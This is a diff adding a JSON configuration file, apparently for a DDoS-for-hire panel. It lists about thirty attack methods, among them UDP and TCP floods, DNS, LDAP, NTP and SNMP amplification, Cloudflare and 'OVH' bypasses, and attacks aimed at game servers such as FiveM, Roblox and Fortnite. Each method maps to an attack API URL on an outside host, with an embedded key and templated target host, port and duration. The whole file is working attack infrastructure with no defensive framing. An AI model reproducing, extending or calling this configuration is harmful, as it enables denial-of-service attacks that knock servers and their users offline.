@@ -1,0 +1,238 @@
+[
+	{
+		"name":"HOME",
+		"time":180,
+		"description":"Udp Flood",
+		"permission":[],
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+		]
+	},
+	{
+		"name":"UDP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP"
+		]
+	},
+ 	{
+		"name":"TCP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP"
+		]
+	},
+  	{
+		"name":"SOCKET",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SOCKET"
+		]
+	},
+ 	{
+		"name":"FIVEM",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
+		]
+	},
+ 	{
+		"name":"OVH-UDP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-UDP"
+		]
+	},
+ 	{
+		"name":"100UP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=100UP"
+		]
+	},
+  	{
+		"name":"RANDHEX",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=RANDHEX"
+		]
+	},
+  	{
+		"name":"CF-BYPASS",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=CF-BYPASS"
+		]
+	},
+ {
+		"name":"BROWSER",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER"
+		]
+	},
+  	{
+		"name":"SSH",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SSH"
+		]
+	},
+	{
+		"name":"OVH",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH"
+		]
+	},
+	{
+		"name":"NFO",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=NFO"
+		]
+	},
+ 	{
+		"name":"HTTPS",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS"
+		]
+	},
+		{
+		"name":"DNS",
+		"time":10800,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DNS"
+		]
+	},
+		{
+		"name":"LDAP",
+		"time":10800,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=LDAP"
+		]
+	},
+		{
+		"name":"GAME",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME"
+		]
+	},
+		{
+		"name":"ROBLOX",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX"
+		]
+	},
+		{
+		"name":"FIVEM",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
+		]
+	},
+ 		{
+		"name":"MIXAMP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXAMP"
+		]
+	},
+ {
+		"name":"FALLGUYS",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FALLGUYS"
+		]
+	},
+ 		{
+		"name":"HYDRA",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HYDRA"
+		]
+	},
+ 		{
+		"name":"VPS-CRUSH",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VPS-CRUSH"
+		]
+	},
+ 		{
+		"name":"NTP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=NTP"
+		]
+	},
+ 		{
+		"name":"SNMP",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SNMP"
+		]
+	},
+ 		{
+		"name":"ARK-255",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ARK-255"
+		]
+	},
+  		{
+		"name":"TEST",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz"
+		]
+	},
+ 		{
+		"name":"RANDHEX",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=RANDHEX"
+		]
+	},
+		{
+		"name":"FORTNITE",
+		"time":200,
+		"description":"OVH Bypass",
+		"api":[
+			"https://astro-sec.xyz/funnel/attack?key=paradox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FORTNITE"
+		]
+	}
+
+]
+
+
